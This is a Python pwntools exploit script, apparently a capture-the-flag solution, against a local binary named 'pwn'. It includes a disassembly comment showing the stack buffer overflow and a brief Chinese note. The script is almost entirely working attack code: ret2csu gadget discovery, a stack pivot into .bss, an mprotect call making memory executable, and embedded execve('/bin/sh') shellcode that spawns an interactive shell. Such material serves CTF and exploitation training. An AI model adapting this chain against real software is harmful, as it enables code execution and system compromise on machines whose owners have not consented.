"""
.text:4006D6 xor     rdi, rdi                        ; sys_read: fd
.text:4006D9 mov     rdx, 100h                       
.text:4006E0 mov     rax, 0
.text:4006E7 lea     rsi, [rbp-0F0h]                 ; buf
.text:4006EE syscall                                 ; LINUX - sys_read
.text:4006F0 mov     eax, 0
.text:4006F5 leave
.text:4006F6 retn

系统内有 mprotect
"""
from pwn import *

s = process("./pwn")
elf = ELF("./pwn")
context(log_level='debug', arch='amd64', os='linux')
padding = 0xf0


def get_csu_address():
    csu_init_address = elf.symbols['__libc_csu_init']
    csu_init_disasm = elf.disasm(csu_init_address, 150)
    instructions = csu_init_disasm.split('ret', 1)[0] + 'ret'
    # print(instructions)

    instructions_rdx = instructions.rsplit('rdx,', 1)
    csu_exec = instructions_rdx[0].splitlines()[-1].split(':')[0].strip()
    csu_start = instructions.splitlines()[-8].split(':')[0].strip()

    csu_exec_int = int(csu_exec, 16)
    csu_start_int = int(csu_start, 16)
    return csu_exec_int, csu_start_int


def csu(rdi, rsi, rdx, func):
    payload = flat('A' * 0x8, 0, 1, func, rdi, rsi, rdx)
    return payload


csu_exec, csu_start = get_csu_address()
success(hex(csu_exec))
success(hex(csu_start))
bss = elf.bss(0x300)
success(f'bss: {bss:X}')
success(f'bss + 0xf0: {bss + 0xf0:X}')
success(f'bss - 8: {bss - 8:X}')

# # csu_start = 0x400606
# # csu_exec2 = 0x4005F0
# gdb.attach(s, "b *0x004006F6\nc")

# stack pivoting, read
main_read = 0x4006D6
payload1 = flat('a' * padding, bss + 0xf0, main_read)
s.sendafter('check it!', payload1)

# mprotect, run code from bss
mprotect = elf.got['mprotect']
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
leave_ret = ROP(elf).find_gadget(['leave', 'ret'])[0]
success(f'leave_ret : {leave_ret:X}')

# set_mprotect = csu(0x601000, 0x1000, 7, mprotect)
set_mprotect = csu(elf.sym.__data_start, 0x1000, 7, mprotect)
set_len = len(set_mprotect)
success(f'bss1: {bss + set_len:X}')
tmp = flat(csu_start, set_mprotect, csu_exec)  # ret, csu, csu_exec
offset = len(flat(tmp, 'c' * 0x38, 0xdeadbeef))  # ret 指令占一个 0xdeadbeef
success(f'len tmp: {offset}')
tmp += flat('c' * 0x38, bss + offset)
tmp += flat(shellcode)
payload2 = flat(tmp.ljust(0xf0, b'\x00'), p64(bss - 8), p64(leave_ret))
print(f'len pay2: {len(payload2)}')
s.send(payload2)

s.interactive()
